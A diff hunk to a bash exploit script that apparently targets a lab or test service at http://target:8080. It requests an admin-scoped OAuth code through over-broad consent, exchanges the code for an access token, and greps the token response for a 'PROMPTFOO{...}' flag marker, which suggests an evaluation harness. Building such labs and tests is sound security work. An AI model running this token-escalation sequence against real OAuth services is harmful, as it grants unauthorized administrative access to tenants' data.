@@ -7,7 +7,9 @@ BASE="${1:-http://target:8080}"
 
 echo "[*] stage 1 — obtain an admin-scoped token via over-broad consent ->"
 code="$(curl -s "$BASE/oauth/authorize?client_id=reporting-app&scope=admin" | python3 -c 'import sys,json;print(json.load(sys.stdin)["code"])')"
-tok="$(curl -s "$BASE/oauth/token?code=$code" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')"
+tokresp="$(curl -s "$BASE/oauth/token?code=$code")"
+printf '%s\n' "$tokresp" | grep -oE 'PROMPTFOO\{[^}]*\}' | head -n1 || true   # s4a_token stage marker (per-hop verify §6.3)
+tok="$(printf '%s' "$tokresp" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')"
 echo "    token=$tok"
 
 echo "[*] stage 2 — perform the protected tenant action ->"
